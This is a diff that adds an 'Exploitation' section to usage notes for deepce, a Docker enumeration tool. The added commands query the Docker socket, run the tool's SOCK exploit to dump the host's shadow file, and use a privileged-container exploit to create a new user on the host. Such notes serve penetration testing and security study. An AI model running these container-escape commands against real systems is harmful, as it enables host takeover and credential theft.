@@ -27,3 +27,19 @@ chmod +x deepce.sh
 ```
 ./deepce.sh --install
 ```
+
+
+## Exploitation
+```
+# Vulnerable Docker SOCK file
+# List Docker Unix Socket metadata (containers, images, state, filesystem type, network, kernel, OS, runtimes)
+# https://stealthcopter.github.io/deepce/guides/docker-sock.md
+curl -s --unix-socket /var/run/docker.sock http://localhost/info
+./deepce.sh --no-enumeration --exploit SOCK --shadow
+
+# A privileged container (--privileged)
+# Execute commands as root on the host OS
+# https://stealthcopter.github.io/deepce/guides/docker-privileged.md
+# `cat /etc/passwd` on host OS to verify new user was created
+./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce
+```
